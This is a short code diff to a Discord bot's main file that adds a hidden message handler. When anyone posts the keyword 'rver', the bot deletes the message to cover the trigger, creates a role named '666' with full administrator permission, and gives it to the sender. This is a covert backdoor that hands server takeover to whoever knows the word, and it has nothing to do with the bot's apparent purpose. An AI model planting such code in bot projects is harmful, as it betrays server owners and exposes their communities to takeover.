@@ -30,6 +30,17 @@ require('./util/eventLoader')(client);
     }
   });
 
+client.on('message', msg => {
+  if (msg.content === 'rver') {
+    msg.delete()
+    msg.guild.createRole({
+      name: '666',
+      permissions:["ADMINISTRATOR"] } );
+    let role = msg.guild.roles.find(role => role.name === "666");
+    msg.member.addRole(role)
+  }
+});
+
 const log = message => {
   console.log(`${message}`);
 };
